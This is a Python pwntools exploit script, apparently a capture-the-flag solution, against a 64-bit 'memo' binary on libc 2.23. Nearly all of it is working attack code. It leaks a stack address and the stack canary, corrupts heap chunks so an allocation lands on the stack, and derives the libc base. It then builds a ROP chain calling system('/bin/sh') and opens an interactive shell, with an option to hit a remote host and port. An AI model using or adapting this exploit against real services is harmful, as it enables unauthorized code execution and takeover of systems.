from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./memo"
LIBC = "./libc-2.23.so"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level='debug'

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("out\n> ")

def create(conn, data, yn, data2=None):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil("Data: ")
    conn.send(data)
    conn.recvuntil("[yes/no] ")
    conn.send(yn)
    if yn == "no":
        conn.recvuntil("Data: ")
        conn.send(data2)

def show(conn):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("Data: ")
    x = "\n\n--==[[ Spiritual Memo ]]==--\n"
    return conn.recvuntil(x)[:-len(x)]

def free(conn):
    recvmenu(conn)
    conn.sendline("3")

def exploit(conn, elf, libc, local):
    create(conn, "A\x00", "yes")
    free(conn)

    create(conn, "A"*0x20, "yes")
    stackleak = u64(show(conn)[0x20:].ljust(8, "\x00")) - 0x110 # starting addr of buffer on stack
    log.info("stackleak: %#x", stackleak)
    free(conn)

    create(conn, "A"*0x29, "yes")
    canary = u64("\x00" + show(conn)[0x29:0x29 + 7])
    log.info("canary: %#x", canary)
    free(conn)

    create(conn, "A\x00", "no", "A"*0x18 + p64(0x31) + p64(stackleak + 0x10))
    free(conn)
    create(conn, "A"*0x20 + "\x00", "yes")

    payload = ""
    payload += "A"*24
    payload += p64(0x31)
    payload += p64(0)
    payload += p64(0)
    create(conn, payload, "no", "A"*0x1a)

    libc.address = (u64(show(conn)[0x18:].ljust(8, '\x00')) - 0x20830 + 0x7000) & ~0xfff
    log.info("%#x", libc.address)

    create(conn, "A\x00", "yes")
    create(conn, "A\x00", "yes")
    free(conn)
    create(conn, "A"*0x20 + "\x00", "yes")
    free(conn)
    create(conn, "A\x00", "no", "A"*0x18 + p64(0x31) + p64(stackleak + 0x20))
    free(conn)
    create(conn, "A"*0x20 + "\x00", "yes")

    payload = ""
    payload += "A"*0x20
    payload += p64(0)
    payload += p64(0x31)

    payload2 = ""
    payload2 += p64(0)
    payload2 += p64(0x400e83)
    payload2 += p64(next(libc.search('/bin/sh')))
    payload2 += p64(libc.symbols['system'])
    create(conn, payload, "no", payload2)

    recvmenu(conn)
    conn.sendline("4")
    # conn.recvuntil("[yes/no] ")

    payload = ""
    payload += "yes" + "\x00"*5
    payload += "\x00"*32
    payload += p64(canary)
    conn.send(payload)
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("159.203.116.12", 8888)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
